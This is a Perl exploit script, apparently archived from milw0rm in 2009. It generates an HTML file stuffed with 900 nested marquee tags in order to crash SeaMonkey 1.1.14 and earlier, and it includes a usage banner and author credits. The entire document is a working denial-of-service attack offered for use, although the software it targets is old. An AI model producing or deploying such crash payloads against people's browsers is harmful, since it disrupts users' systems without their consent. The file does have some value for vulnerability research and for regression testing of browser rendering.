#!/usr/bin/perl
# SeaMonkey <= 1.1.14 (marquee) Denial of Service Exploit
# by athos - staker[at]hotmail[dot]it
# tested on ubuntu 8.10 / slackware 12.2
# thanks to SirDark because he has tested on slackware

my $data = undef;
my $file = shift or &usage;

exploit();

sub exploit {

   $data .= "<html><head><title>";
   $data .= "SeaMonkey <= 1.1.14 (marquee) Denial of Service Exploit";
   $data .= "</title></head><body>";
   $data .= "<marquee>" x900;
   $data .= "</body></html>";

   open(FILE,'>',$file) or die('file error');
   print FILE $data;
   close(FILE);
}


sub usage {
    
   print "\n+---------------------------------------------------------+\r".
         "\n| SeaMonkey <= 1.1.14 (marquee) Denial of Service Exploit |\r".
         "\n+---------------------------------------------------------+\r".
         "\nby athos - staker[at]hotmail[dot]it\n".
         "\nUsage\n".
         "\rperl $0 [file name]\n".
         "\rperl $0 crash.html\n";
   exit;      
}    

# milw0rm.com [2009-01-06]
